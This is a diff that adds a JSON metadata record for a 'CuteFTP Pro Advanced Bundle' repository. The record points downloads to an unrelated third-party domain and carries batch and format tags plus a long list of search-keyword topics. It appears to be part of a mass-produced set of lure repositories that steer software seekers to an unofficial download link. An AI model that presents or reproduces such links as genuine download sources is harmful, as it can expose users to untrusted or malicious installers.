@@ -1,0 +1,25 @@
+{
+  "repo": "cuteftp-pro-advanced-bundle",
+  "product": "CuteFTP Pro Advanced Bundle",
+  "kind": "network",
+  "install_type": "download",
+  "download_url": "https://cuteftp.mefidirect.xyz/",
+  "batch": "new33",
+  "format": "license-md-only",
+  "category": "network",
+  "topics": [
+    "cuteftp-faq",
+    "cuteftp-download-page",
+    "cuteftp-windows",
+    "install-cuteftp-windows",
+    "cuteftp-getting-started",
+    "cuteftp-release",
+    "utility",
+    "configuration",
+    "deployment",
+    "office-ready",
+    "daily-driver",
+    "pro-workflow",
+    "pc-edition"
+  ]
+}
